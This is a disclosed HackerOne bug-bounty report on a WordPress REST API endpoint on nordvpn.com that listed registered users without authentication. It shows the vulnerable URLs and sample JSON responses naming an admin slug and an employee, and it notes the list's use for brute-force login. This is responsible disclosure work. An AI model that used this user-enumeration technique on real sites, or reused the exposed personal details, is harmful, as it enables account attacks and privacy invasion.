---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '753725'
original_report_id: '753725'
title: Disclosure of User Information
weakness: Information Disclosure
team_handle: nordsecurity
created_at: '2019-12-07T17:18:15.954Z'
disclosed_at: '2020-01-16T01:52:02.714Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 86
asset_identifier: '*.nordvpn.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Disclosure of User Information

## Metadata

- HackerOne Report ID: 753725
- Weakness: Information Disclosure
- Program: nordsecurity
- Disclosed At: 2020-01-16T01:52:02.714Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Team,
 
We can get information about the users registered (such as: id, name, login name, etc.) and employees of NordVPN without authentication on https://www.nordvpn.com

Vulnerable URL:  https://nordvpn.com/wp-json/wp/v2/users/
Vulnerable URL: https://nordvpn.com/?rest_route=/wp/v2/users/

POC: Screenshots are attached 
---------------------------------------------------------------------------------------------------------------------------------------
Response 1: 
{
  "id": 1,
  "name": "21232f297a57a5a743894a0e4a801fc3",
  "url": "",
  "description": "",
  "link": "",
  "slug": "admin",
  "avatar_urls": {
    "24": "https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=24&d=mm&r=g",
    "48": "https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=48&d=mm&r=g",
    "96": "https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=96&d=mm&r=g"
  },
  "meta": [],
  "_links": {
    "self": [
      {
        "href": "https://nordvpn.com/wp-json/wp/v2/users/1"
      }
    ],
    "collection": [
      {
        "href": "https://nordvpn.com/wp-json/wp/v2/users"
      }
    ]
  }
}
----------------------------------------------------------------------------------------------------------------
Response 2:
{
  "id": 8,
  "name": "Christina Craig",
  "url": "",
  "description": "Christina is a community manager and the heart, the voice and the soul of NordVPN. She is always up for a conversation with our community of users and blog readers.",
  "link": "",
  "slug": "christina",
  "avatar_urls": {
    "24": "https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=24&d=mm&r=g",
    "48": "https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=48&d=mm&r=g",
    "96": "https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=96&d=mm&r=g"
  },
  "meta": [],
  "_links": {
    "self": [
      {
        "href": "https://nordvpn.com/wp-json/wp/v2/users/8"
      }
    ],
    "collection": [
      {
        "href": "https://nordvpn.com/wp-json/wp/v2/users"
      }
    ]
  }
}
------------------------------------------------------------------------------------------------------------------------------------
Thanks and waiting for your response.

## Impact

1) Attacker can user these valuable information for advance attack as bruteforce login.
2)It is possible to get all the users registered on the system and create a bruteforce directed to these users.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
